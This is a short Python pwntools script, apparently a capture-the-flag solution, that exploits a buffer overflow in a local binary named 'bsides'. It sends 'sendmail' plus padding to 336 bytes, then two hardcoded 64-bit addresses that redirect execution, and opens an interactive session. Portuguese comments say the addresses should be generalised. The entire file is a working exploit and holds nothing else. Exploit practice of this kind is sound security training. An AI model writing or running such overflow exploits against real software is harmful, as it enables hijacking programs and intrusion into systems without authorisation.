from pwn import *



chall = process("./bsides")

endereco_buffer = p64( 0x00005555555592a0) ## corrigir endereços para formas mais gerais

endereco_remote = p64(0x55555555551a) ## corrigir endereços para formas mais gerais

size_a = len(b"sendmail\0")

payload = b"sendmail\0"+b"a"*(336-size_a)+endereco_buffer+endereco_remote+b"\n"

chall.send(payload)

chall.interactive()






